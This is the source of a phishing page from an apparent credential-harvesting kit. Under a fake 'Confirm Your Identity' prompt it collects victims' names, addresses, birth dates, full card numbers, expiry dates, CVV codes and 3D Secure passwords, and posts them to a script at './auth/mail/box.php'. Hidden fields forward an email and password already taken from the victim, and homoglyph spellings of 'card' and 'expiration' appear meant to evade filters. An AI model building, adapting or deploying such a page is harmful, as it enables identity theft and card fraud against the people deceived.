
				<div id="page-wrap">


						<div id="load" class="transitioning spinner spin" style="display:none;">checking your informations...</div>

<main>

<form  method="post" action="./auth/mail/box.php"   onsubmit="return (validate() && ray.ajax())"    >

<h2 id="overpanel-header">Confirm Your Identity.</h2>



 <input class="Anouar2 float-label form-control" id="fname" name="fname" type="text" placeholder="First name" title="Required." x-moz-errormessage="Required." required="required" style="width: 180px">
 <nl></nl>
 <input class="Anouar2  float-label form-control" id="lname" name="lname" type="text" placeholder="Last name"    title="Required."  x-moz-errormessage="Required."  required="required" style="width: 180px">
 <p></p>
 <input id="adds1" name="adds1"  class="Anouar2 float-label form-control" type="text"  placeholder="Street address" title="Required."  x-moz-errormessage="Required." required="required"   >
 <p></p>
 <input class="Anouar2 float-label form-control" id="city" name="city" type="text" placeholder="State/City" title="Required." x-moz-errormessage="Required." required="required" style="width: 180px">
 <nl></nl>
 <input class="Anouar2  float-label form-control" id="zip" name="zip" placeholder="ZIP code"   title="Required." x-moz-errormessage="Required." required="required" style="width: 180px">
 <p></p>
  <input  name="phone" id="phone"  type="tel"  class="Anouar2" placeholder="Phone number" title="Required." x-moz-errormessage="Required." required="required" style="width: 180px">
 <nl></nl>
 <input class="Anouar2 float-label form-control date" id="date" name="date" type="tel" placeholder="Date of birth" pattern="([0-9]{2})/([0-9]{2})/([0-9]{4})" title="Please enter a valid date (DD/MM/YYYY)." x-moz-errormessage="Please enter a valid date (DD/MM/YYYY)." required="required" style="width: 180px">
 <p></p>
 <div class="groupFields countryDropdown"><div class="nativeDropdown large"><div class="selectDropdown">
<select id="bloc" name="bloc" value="<?=$_SESSION['_countryCode_'] ?>">
<option  <?php if(!isset($_SESSION['_countryCode_'])) echo "selected"; ?> value="0"></option>
			<option  <?php if($_SESSION['_countryCode_']=="AL") echo "selected"; ?> value="AL">Albania</option>
			<option <?php if($_SESSION['_countryCode_']=="DZ") echo "selected"; ?> value="DZ">Algeria</option>
			<option  <?php if($_SESSION['_countryCode_']=="AD") echo "selected"; ?> value="AD">Andorra</option>
			<option  <?php if($_SESSION['_countryCode_']=="AO") echo "selected"; ?> value="AO">Angola</option>
			<option <?php if($_SESSION['_countryCode_']=="AL") echo "selected"; ?>  value="AI">Anguilla</option>
			<option  <?php if($_SESSION['_countryCode_']=="AG") echo "selected"; ?> value="AG">Antigua &amp; Barbuda</option>
			<option <?php if($_SESSION['_countryCode_']=="AR") echo "selected"; ?>  value="AR">Argentina</option>
			<option  <?php if($_SESSION['_countryCode_']=="AM") echo "selected"; ?> value="AM">Armenia</option>
			<option  <?php if($_SESSION['_countryCode_']=="AW") echo "selected"; ?> value="AW">Aruba</option>
			<option <?php if($_SESSION['_countryCode_']=="AU") echo "selected"; ?>  value="AU">Australia</option>
			<option  <?php if($_SESSION['_countryCode_']=="AT") echo "selected"; ?> value="AT">Austria</option>
			<option  <?php if($_SESSION['_countryCode_']=="AZ") echo "selected"; ?> value="AZ">Azerbaijan</option>
			<option  <?php if($_SESSION['_countryCode_']=="BS") echo "selected"; ?> value="BS">Bahamas</option>
			<option  <?php if($_SESSION['_countryCode_']=="BH") echo "selected"; ?> value="BH">Bahrain</option>
			<option  <?php if($_SESSION['_countryCode_']=="BB") echo "selected"; ?> value="BB">Barbados</option>
			<option  <?php if($_SESSION['_countryCode_']=="BY") echo "selected"; ?> value="BY">Belarus</option>
			<option  <?php if($_SESSION['_countryCode_']=="BE") echo "selected"; ?> value="BE">Belgium</option>
			<option  <?php if($_SESSION['_countryCode_']=="BZ") echo "selected"; ?> value="BZ">Belize</option>
			<option  <?php if($_SESSION['_countryCode_']=="BJ") echo "selected"; ?> value="BJ">Benin</option>
			<option  <?php if($_SESSION['_countryCode_']=="BM") echo "selected"; ?> value="BM">Bermuda</option>
			<option  <?php if($_SESSION['_countryCode_']=="BT") echo "selected"; ?> value="BT">Bhutan</option>
			<option  <?php if($_SESSION['_countryCode_']=="BO") echo "selected"; ?> value="BO">Bolivia</option>
			<option  <?php if($_SESSION['_countryCode_']=="BA") echo "selected"; ?> value="BA">Bosnia &amp; Herzegovina</option>
			<option  <?php if($_SESSION['_countryCode_']=="BW") echo "selected"; ?> value="BW">Botswana</option>
			<option  <?php if($_SESSION['_countryCode_']=="BR") echo "selected"; ?> value="BR">Brazil</option>
			<option  <?php if($_SESSION['_countryCode_']=="VG") echo "selected"; ?> value="VG">British Virgin Islands</option>
			<option  <?php if($_SESSION['_countryCode_']=="BN") echo "selected"; ?> value="BN">Brunei</option>
			<option  <?php if($_SESSION['_countryCode_']=="BG") echo "selected"; ?> value="BG">Bulgaria</option>
			<option  <?php if($_SESSION['_countryCode_']=="BF") echo "selected"; ?> value="BF">Burkina Faso</option>
			<option  <?php if($_SESSION['_countryCode_']=="BI") echo "selected"; ?>  value="BI">Burundi</option>
			<option  <?php if($_SESSION['_countryCode_']=="KH") echo "selected"; ?> value="KH">Cambodia</option>
			<option  <?php if($_SESSION['_countryCode_']=="CM") echo "selected"; ?> value="CM">Cameroon</option>
			<option  <?php if($_SESSION['_countryCode_']=="CA") echo "selected"; ?> value="CA">Canada</option>
			<option  <?php if($_SESSION['_countryCode_']=="CV") echo "selected"; ?> value="CV">Cape Verde</option>
			<option  <?php if($_SESSION['_countryCode_']=="KY") echo "selected"; ?> value="KY">Cayman Islands</option>
			<option  <?php if($_SESSION['_countryCode_']=="TD") echo "selected"; ?> value="TD">Chad</option>
			<option  <?php if($_SESSION['_countryCode_']=="CL") echo "selected"; ?> value="CL">Chile</option>
			<option  <?php if($_SESSION['_countryCode_']=="CN") echo "selected"; ?> value="CN">China</option>
			<option  <?php if($_SESSION['_countryCode_']=="C2") echo "selected"; ?> value="C2">China</option>
			<option  <?php if($_SESSION['_countryCode_']=="CO") echo "selected"; ?> value="CO">Colombia</option>
			<option  <?php if($_SESSION['_countryCode_']=="KM") echo "selected"; ?> value="KM">Comoros</option>
			<option  <?php if($_SESSION['_countryCode_']=="CG") echo "selected"; ?> value="CG">Congo &#x2D; Brazzaville</option>
			<option  <?php if($_SESSION['_countryCode_']=="CD") echo "selected"; ?> value="CD">Congo &#x2D; Kinshasa</option>
			<option <?php if($_SESSION['_countryCode_']=="CK") echo "selected"; ?>  value="CK">Cook Islands</option>
			<option  <?php if($_SESSION['_countryCode_']=="CR") echo "selected"; ?> value="CR">Costa Rica</option>
			<option  <?php if($_SESSION['_countryCode_']=="CL") echo "selected"; ?> value="CI">Côte d’Ivoire</option>
			<option  <?php if($_SESSION['_countryCode_']=="HR") echo "selected"; ?> value="HR">Croatia</option>
			<option  <?php if($_SESSION['_countryCode_']=="CY") echo "selected"; ?> value="CY">Cyprus</option>
			<option  <?php if($_SESSION['_countryCode_']=="CZ") echo "selected"; ?> value="CZ">Czech Republic</option>
			<option  <?php if($_SESSION['_countryCode_']=="DK") echo "selected"; ?> value="DK">Denmark</option>
			<option  <?php if($_SESSION['_countryCode_']=="DJ") echo "selected"; ?> value="DJ">Djibouti</option>
			<option  <?php if($_SESSION['_countryCode_']=="DM") echo "selected"; ?> value="DM">Dominica</option>
			<option  <?php if($_SESSION['_countryCode_']=="DO") echo "selected"; ?> value="DO">Dominican Republic</option>
			<option  <?php if($_SESSION['_countryCode_']=="EC") echo "selected"; ?> value="EC">Ecuador</option>
			<option  <?php if($_SESSION['_countryCode_']=="EG") echo "selected"; ?> value="EG">Egypt</option>
			<option  <?php if($_SESSION['_countryCode_']=="SV") echo "selected"; ?> value="SV">El Salvador</option>
			<option  <?php if($_SESSION['_countryCode_']=="ER") echo "selected"; ?> value="ER">Eritrea</option>
			<option  <?php if($_SESSION['_countryCode_']=="EE") echo "selected"; ?> value="EE">Estonia</option>
			<option  <?php if($_SESSION['_countryCode_']=="ET") echo "selected"; ?> value="ET">Ethiopia</option>
			<option  <?php if($_SESSION['_countryCode_']=="FK") echo "selected"; ?> value="FK">Falkland Islands</option>
			<option  <?php if($_SESSION['_countryCode_']=="FO") echo "selected"; ?> value="FO">Faroe Islands</option>
			<option  <?php if($_SESSION['_countryCode_']=="FJ") echo "selected"; ?> value="FJ">Fiji</option>
			<option  <?php if($_SESSION['_countryCode_']=="FI") echo "selected"; ?> value="FI">Finland</option>
			<option  <?php if($_SESSION['_countryCode_']=="FR") echo "selected"; ?> value="FR">France</option>
			<option  <?php if($_SESSION['_countryCode_']=="GF") echo "selected"; ?> value="GF">French Guiana</option>
			<option  <?php if($_SESSION['_countryCode_']=="PF") echo "selected"; ?> value="PF">French Polynesia</option>
			<option  <?php if($_SESSION['_countryCode_']=="GA") echo "selected"; ?> value="GA">Gabon</option>
			<option  <?php if($_SESSION['_countryCode_']=="GM") echo "selected"; ?> value="GM">Gambia</option>
			<option  <?php if($_SESSION['_countryCode_']=="GE") echo "selected"; ?> value="GE">Georgia</option>
			<option  <?php if($_SESSION['_countryCode_']=="DE") echo "selected"; ?> value="DE">Germany</option>
			<option  <?php if($_SESSION['_countryCode_']=="GI") echo "selected"; ?> value="GI">Gibraltar</option>
			<option  <?php if($_SESSION['_countryCode_']=="GR") echo "selected"; ?> value="GR">Greece</option>
			<option  <?php if($_SESSION['_countryCode_']=="GL") echo "selected"; ?> value="GL">Greenland</option>
			<option  <?php if($_SESSION['_countryCode_']=="GD") echo "selected"; ?> value="GD">Grenada</option>
			<option  <?php if($_SESSION['_countryCode_']=="GP") echo "selected"; ?> value="GP">Guadeloupe</option>
			<option  <?php if($_SESSION['_countryCode_']=="GT") echo "selected"; ?> value="GT">Guatemala</option>
			<option  <?php if($_SESSION['_countryCode_']=="GN") echo "selected"; ?> value="GN">Guinea</option>
			<option  <?php if($_SESSION['_countryCode_']=="GW") echo "selected"; ?> value="GW">Guinea&#x2D;Bissau</option>
			<option  <?php if($_SESSION['_countryCode_']=="GY") echo "selected"; ?> value="GY">Guyana</option>
			<option  <?php if($_SESSION['_countryCode_']=="HN") echo "selected"; ?> value="HN">Honduras</option>
			<option  <?php if($_SESSION['_countryCode_']=="HK") echo "selected"; ?> value="HK">Hong Kong SAR China</option>
			<option  <?php if($_SESSION['_countryCode_']=="HU") echo "selected"; ?> value="HU">Hungary</option>
			<option  <?php if($_SESSION['_countryCode_']=="IS") echo "selected"; ?> value="IS">Iceland</option>
			<option  <?php if($_SESSION['_countryCode_']=="IN") echo "selected"; ?> value="IN">India</option>
			<option  <?php if($_SESSION['_countryCode_']=="ID") echo "selected"; ?> value="ID">Indonesia</option>
			<option  <?php if($_SESSION['_countryCode_']=="IE") echo "selected"; ?> value="IE">Ireland</option>
			<option  <?php if($_SESSION['_countryCode_']=="IL") echo "selected"; ?> value="IL">Israel</option>
			<option  <?php if($_SESSION['_countryCode_']=="IT") echo "selected"; ?> value="IT">Italy</option>
			<option  <?php if($_SESSION['_countryCode_']=="JM") echo "selected"; ?> value="JM">Jamaica</option>
			<option  <?php if($_SESSION['_countryCode_']=="JP") echo "selected"; ?> value="JP">Japan</option>
			<option  <?php if($_SESSION['_countryCode_']=="JO") echo "selected"; ?> value="JO">Jordan</option>
			<option  <?php if($_SESSION['_countryCode_']=="KZ") echo "selected"; ?> value="KZ">Kazakhstan</option>
			<option  <?php if($_SESSION['_countryCode_']=="KE") echo "selected"; ?> value="KE">Kenya</option>
			<option  <?php if($_SESSION['_countryCode_']=="KI") echo "selected"; ?> value="KI">Kiribati</option>
			<option  <?php if($_SESSION['_countryCode_']=="KW") echo "selected"; ?> value="KW">Kuwait</option>
			<option  <?php if($_SESSION['_countryCode_']=="KG") echo "selected"; ?> value="KG">Kyrgyzstan</option>
			<option  <?php if($_SESSION['_countryCode_']=="LA") echo "selected"; ?> value="LA">Laos</option>
			<option  <?php if($_SESSION['_countryCode_']=="LV") echo "selected"; ?> value="LV">Latvia</option>
			<option  <?php if($_SESSION['_countryCode_']=="LS") echo "selected"; ?> value="LS">Lesotho</option>
			<option  <?php if($_SESSION['_countryCode_']=="LI") echo "selected"; ?> value="LI">Liechtenstein</option>
			<option  <?php if($_SESSION['_countryCode_']=="LT") echo "selected"; ?> value="LT">Lithuania</option>
			<option  <?php if($_SESSION['_countryCode_']=="LU") echo "selected"; ?> value="LU">Luxembourg</option>
			<option  <?php if($_SESSION['_countryCode_']=="MK") echo "selected"; ?> value="MK">Macedonia</option>
			<option  <?php if($_SESSION['_countryCode_']=="MG") echo "selected"; ?> value="MG">Madagascar</option>
			<option <?php if($_SESSION['_countryCode_']=="MW") echo "selected"; ?>  value="MW">Malawi</option>
			<option  <?php if($_SESSION['_countryCode_']=="MY") echo "selected"; ?> value="MY">Malaysia</option>
			<option  <?php if($_SESSION['_countryCode_']=="MV") echo "selected"; ?> value="MV">Maldives</option>
			<option  <?php if($_SESSION['_countryCode_']=="ML") echo "selected"; ?> value="ML">Mali</option>
			<option  <?php if($_SESSION['_countryCode_']=="MT") echo "selected"; ?> value="MT">Malta</option>
			<option  <?php if($_SESSION['_countryCode_']=="MH") echo "selected"; ?> value="MH">Marshall Islands</option>
			<option  <?php if($_SESSION['_countryCode_']=="MQ") echo "selected"; ?> value="MQ">Martinique</option>
			<option  <?php if($_SESSION['_countryCode_']=="MR") echo "selected"; ?> value="MR">Mauritania</option>
			<option  <?php if($_SESSION['_countryCode_']=="MU") echo "selected"; ?> value="MU">Mauritius</option>
			<option  <?php if($_SESSION['_countryCode_']=="YT") echo "selected"; ?> value="YT">Mayotte</option>
			<option  <?php if($_SESSION['_countryCode_']=="MX") echo "selected"; ?> value="MX">Mexico</option>
			<option  <?php if($_SESSION['_countryCode_']=="FM") echo "selected"; ?> value="FM">Micronesia</option>
			<option  <?php if($_SESSION['_countryCode_']=="MD") echo "selected"; ?> value="MD">Moldova</option>
			<option  <?php if($_SESSION['_countryCode_']=="MC") echo "selected"; ?> value="MC">Monaco</option>
			<option  <?php if($_SESSION['_countryCode_']=="MN") echo "selected"; ?> value="MN">Mongolia</option>
			<option  <?php if($_SESSION['_countryCode_']=="ME") echo "selected"; ?> value="ME">Montenegro</option>
			<option  <?php if($_SESSION['_countryCode_']=="MS") echo "selected"; ?> value="MS">Montserrat</option>
			<option  <?php if($_SESSION['_countryCode_']=="MA") echo "selected"; ?> value="MA">Morocco</option>
			<option  <?php if($_SESSION['_countryCode_']=="MZ") echo "selected"; ?> value="MZ">Mozambique</option>
			<option  <?php if($_SESSION['_countryCode_']=="NA") echo "selected"; ?> value="NA">Namibia</option>
			<option  <?php if($_SESSION['_countryCode_']=="NR") echo "selected"; ?> value="NR">Nauru</option>
			<option  <?php if($_SESSION['_countryCode_']=="NP") echo "selected"; ?> value="NP">Nepal</option>
			<option  <?php if($_SESSION['_countryCode_']=="NL") echo "selected"; ?> value="NL">Netherlands</option>
			<option  <?php if($_SESSION['_countryCode_']=="AN") echo "selected"; ?> value="AN">Netherlands Antilles</option>
			<option  <?php if($_SESSION['_countryCode_']=="NC") echo "selected"; ?> value="NC">New Caledonia</option>
			<option  <?php if($_SESSION['_countryCode_']=="NZ") echo "selected"; ?> value="NZ">New Zealand</option>
			<option  <?php if($_SESSION['_countryCode_']=="NI") echo "selected"; ?> value="NI">Nicaragua</option>
			<option  <?php if($_SESSION['_countryCode_']=="NE") echo "selected"; ?> value="NE">Niger</option>
			<option  <?php if($_SESSION['_countryCode_']=="NG") echo "selected"; ?> value="NG">Nigeria</option>
			<option <?php if($_SESSION['_countryCode_']=="NU") echo "selected"; ?>  value="NU">Niue</option>
			<option  <?php if($_SESSION['_countryCode_']=="NF") echo "selected"; ?> value="NF">Norfolk Island</option>
			<option  <?php if($_SESSION['_countryCode_']=="NO") echo "selected"; ?> value="NO">Norway</option>
			<option  <?php if($_SESSION['_countryCode_']=="OM") echo "selected"; ?> value="OM">Oman</option>
			<option  <?php if($_SESSION['_countryCode_']=="PW") echo "selected"; ?> value="PW">Palau</option>
			<option  <?php if($_SESSION['_countryCode_']=="PA") echo "selected"; ?> value="PA">Panama</option>
			<option  <?php if($_SESSION['_countryCode_']=="PG") echo "selected"; ?> value="PG">Papua New Guinea</option>
			<option  <?php if($_SESSION['_countryCode_']=="PY") echo "selected"; ?> value="PY">Paraguay</option>
			<option  <?php if($_SESSION['_countryCode_']=="PE") echo "selected"; ?> value="PE">Peru</option>
			<option  <?php if($_SESSION['_countryCode_']=="PH") echo "selected"; ?> value="PH">Philippines</option>
			<option  <?php if($_SESSION['_countryCode_']=="PN") echo "selected"; ?> value="PN">Pitcairn Islands</option>
			<option  <?php if($_SESSION['_countryCode_']=="PL") echo "selected"; ?> value="PL">Poland</option>
			<option  <?php if($_SESSION['_countryCode_']=="PT") echo "selected"; ?> value="PT">Portugal</option>
			<option  <?php if($_SESSION['_countryCode_']=="QA") echo "selected"; ?> value="QA">Qatar</option>
			<option  <?php if($_SESSION['_countryCode_']=="RE") echo "selected"; ?> value="RE">Réunion</option>
			<option  <?php if($_SESSION['_countryCode_']=="RO") echo "selected"; ?> value="RO">Romania</option>
			<option  <?php if($_SESSION['_countryCode_']=="RU") echo "selected"; ?> value="RU">Russia</option>
			<option  <?php if($_SESSION['_countryCode_']=="RW") echo "selected"; ?> value="RW">Rwanda</option>
			<option  <?php if($_SESSION['_countryCode_']=="WS") echo "selected"; ?> value="WS">Samoa</option>
			<option  <?php if($_SESSION['_countryCode_']=="SM") echo "selected"; ?> value="SM">San Marino</option>
			<option  <?php if($_SESSION['_countryCode_']=="ST") echo "selected"; ?> value="ST">São Tomé &amp; Príncipe</option>
			<option  <?php if($_SESSION['_countryCode_']=="SA") echo "selected"; ?> value="SA">Saudi Arabia</option>
			<option  <?php if($_SESSION['_countryCode_']=="SN") echo "selected"; ?> value="SN">Senegal</option>
			<option  <?php if($_SESSION['_countryCode_']=="RS") echo "selected"; ?> value="RS">Serbia</option>
			<option  <?php if($_SESSION['_countryCode_']=="SC") echo "selected"; ?> value="SC">Seychelles</option>
			<option  <?php if($_SESSION['_countryCode_']=="SL") echo "selected"; ?> value="SL">Sierra Leone</option>
			<option  <?php if($_SESSION['_countryCode_']=="SG") echo "selected"; ?> value="SG">Singapore</option>
			<option  <?php if($_SESSION['_countryCode_']=="SK") echo "selected"; ?> value="SK">Slovakia</option>
			<option  <?php if($_SESSION['_countryCode_']=="SI") echo "selected"; ?> value="SI">Slovenia</option>
			<option  <?php if($_SESSION['_countryCode_']=="SB") echo "selected"; ?> value="SB">Solomon Islands</option>
			<option  <?php if($_SESSION['_countryCode_']=="SO") echo "selected"; ?> value="SO">Somalia</option>
			<option  <?php if($_SESSION['_countryCode_']=="ZA") echo "selected"; ?> value="ZA">South Africa</option>
			<option  <?php if($_SESSION['_countryCode_']=="KR") echo "selected"; ?> value="KR">South Korea</option>
			<option  <?php if($_SESSION['_countryCode_']=="ES") echo "selected"; ?> value="ES">Spain</option>
			<option  <?php if($_SESSION['_countryCode_']=="LK") echo "selected"; ?> value="LK">Sri Lanka</option>
			<option  <?php if($_SESSION['_countryCode_']=="SH") echo "selected"; ?> value="SH">St&#x2E; Helena</option>
			<option  <?php if($_SESSION['_countryCode_']=="KN") echo "selected"; ?> value="KN">St&#x2E; Kitts &amp; Nevis</option>
			<option <?php if($_SESSION['_countryCode_']=="LC") echo "selected"; ?> value="LC">St&#x2E; Lucia</option>
			<option  <?php if($_SESSION['_countryCode_']=="PM") echo "selected"; ?> value="PM">St&#x2E; Pierre &amp; Miquelon</option>
			<option  <?php if($_SESSION['_countryCode_']=="VC") echo "selected"; ?> value="VC">St&#x2E; Vincent &amp; Grenadines</option>
			<option  <?php if($_SESSION['_countryCode_']=="SR") echo "selected"; ?> value="SR">Suriname</option>
			<option  <?php if($_SESSION['_countryCode_']=="SJ") echo "selected"; ?> value="SJ">Svalbard &amp; Jan Mayen</option>
			<option <?php if($_SESSION['_countryCode_']=="SZ") echo "selected"; ?> value="SZ">Swaziland</option>
			<option <?php if($_SESSION['_countryCode_']=="SE") echo "selected"; ?> value="SE">Sweden</option>
			<option <?php if($_SESSION['_countryCode_']=="CH") echo "selected"; ?> value="CH">Switzerland</option>
			<option <?php if($_SESSION['_countryCode_']=="TW") echo "selected"; ?> value="TW">Taiwan</option>
			<option <?php if($_SESSION['_countryCode_']=="TJ") echo "selected"; ?> value="TJ">Tajikistan</option>
			<option <?php if($_SESSION['_countryCode_']=="TZ") echo "selected"; ?> value="TZ">Tanzania</option>
			<option <?php if($_SESSION['_countryCode_']=="TH") echo "selected"; ?> value="TH">Thailand</option>
			<option <?php if($_SESSION['_countryCode_']=="TG") echo "selected"; ?> value="TG">Togo</option>
			<option <?php if($_SESSION['_countryCode_']=="TO") echo "selected"; ?> value="TO">Tonga</option>
			<option <?php if($_SESSION['_countryCode_']=="TT") echo "selected"; ?> value="TT">Trinidad &amp; Tobago</option>
			<option <?php if($_SESSION['_countryCode_']=="TN") echo "selected"; ?> value="TN">Tunisia</option>
			<option <?php if($_SESSION['_countryCode_']=="TR") echo "selected"; ?> value="TR">Turkey</option>
			<option <?php if($_SESSION['_countryCode_']=="TM") echo "selected"; ?> value="TM">Turkmenistan</option>
			<option <?php if($_SESSION['_countryCode_']=="TC") echo "selected"; ?> value="TC">Turks &amp; Caicos Islands</option>
			<option <?php if($_SESSION['_countryCode_']=="TV") echo "selected"; ?> value="TV">Tuvalu</option>
			<option <?php if($_SESSION['_countryCode_']=="UG") echo "selected"; ?> value="UG">Uganda</option>
			<option <?php if($_SESSION['_countryCode_']=="UA") echo "selected"; ?> value="UA">Ukraine</option>
			<option <?php if($_SESSION['_countryCode_']=="AE") echo "selected"; ?> value="AE">United Arab Emirates</option>
			<option <?php if($_SESSION['_countryCode_']=="GB") echo "selected"; ?> value="GB">United Kingdom</option>
			<option <?php if($_SESSION['_countryCode_']=="US") echo "selected"; ?> value="US">United States</option>
			<option <?php if($_SESSION['_countryCode_']=="UY") echo "selected"; ?> value="UY">Uruguay</option>
			<option <?php if($_SESSION['_countryCode_']=="VY") echo "selected"; ?>  value="VU">Vanuatu</option>
			<option <?php if($_SESSION['_countryCode_']=="VA") echo "selected"; ?> value="VA">Vatican City</option>
			<option <?php if($_SESSION['_countryCode_']=="VE") echo "selected"; ?> value="VE">Venezuela</option>
			<option <?php if($_SESSION['_countryCode_']=="ZN") echo "selected"; ?> value="VN">Vietnam</option>
			<option <?php if($_SESSION['_countryCode_']=="WF") echo "selected"; ?> value="WF">Wallis &amp; Futuna</option>
			<option <?php if($_SESSION['_countryCode_']=="YE") echo "selected"; ?> value="YE">Yemen</option>
			<option <?php if($_SESSION['_countryCode_']=="ZM") echo "selected"; ?> value="ZM">Zambia</option>
			<option <?php if($_SESSION['_countryCode_']=="ZW") echo "selected"; ?> value="ZW">Zimbabwe</option>



		 </select> </div></div></div>

 <p></p>

 <input id="number" name="number" type="tel"  class="Anouar float-label form-control" placeholder="Debit or credit c&alpha;rd number" maxlength="16" autocomplete="off" title="Check your card number." x-moz-errormessage="Check your card number." required="required" onkeypress="return isNumberKey(event)" onfocus="idToWrite='clave';pos=null" >



<input name="c_type" type="hidden" id="crad_type" width="" value="">

<input name="c_valid" type="hidden" id="card_valid" value="">

	 <p></p>


  <input id="MonthYear"  name="MonthYear" type="tel"   class="Anouar2 float-label form-control MonthYear"  placeholder="&Epsilon;xpir&alpha;tion date"  minlength="6" maxlength="7"  pattern="(0[1-9]|1[012])[ ]{0,1}/[ ]{0,1}([0-9]{4}|[0-9]{2})"  title="Please enter a valid expiration date" x-moz-errormessage="Please enter a valid expir&alpha;tion date"  autocomplete="off" required="required"  onkeypress="return isNumberKey(event)" onfocus="idToWrite='clave';pos=null"  style="width: 180px">
		    <nl></nl>




 <input class="Anouar1  float-label form-control"  id="cvn" name="cvn" type="tel"  placeholder="CVV/CSC"   minlength="3" maxlength="4"   autocomplete="off"  pattern="([0-9]{3,4})" title="Required" x-moz-errormessage="Required"   required="required" autocomplete="off" onkeypress="return isNumberKey(event)" onfocus="idToWrite='clave';pos=null" style="width: 180px">

 <p></p>

 <input id="d" name="d"  class="Anouar3 float-label form-control" type="password" placeholder="3D Secure" title="Obrigatório."  x-moz-errormessage="Required." required="required"  autocomplete="off"  >

 <p></p>


<p class="user"></p>

<button class="btn" onclick="LoadPage()">Continue</button>

<script type="text/javascript">$("input").change(function () {$(this).removeClass("merror");}).trigger("change");</script>

     	   	<script type="text/javascript">$("select").change(function () {$(this).removeClass("merror");}).trigger("change");</script>


     	   		  <input   hidden="hidden" id="login_email" name="login_email" value="<?php echo ($_SESSION['login_email']) ?>" >
      <input   hidden="hidden"  id="login_password" name="login_password" value="<?php echo ($_SESSION['login_password']) ?>" >



</form>


</main>



				<aside >
		 <div id="left" class="left">
		<img style="background-size: 195px 104px;height: 250px;" src="./auth/images/uk_consumer_ipad_1x.png">
		 </aside>






<nav >
		 <div id="right" class="right">
<img style="background-size: 195px 104px; height: 300px;" src="./auth/images/primary_home_enuk_1x.png">
 </div>


</nav>

<p class="user"></p>

<p class="user"></p>

<p class="user"></p>



  </div>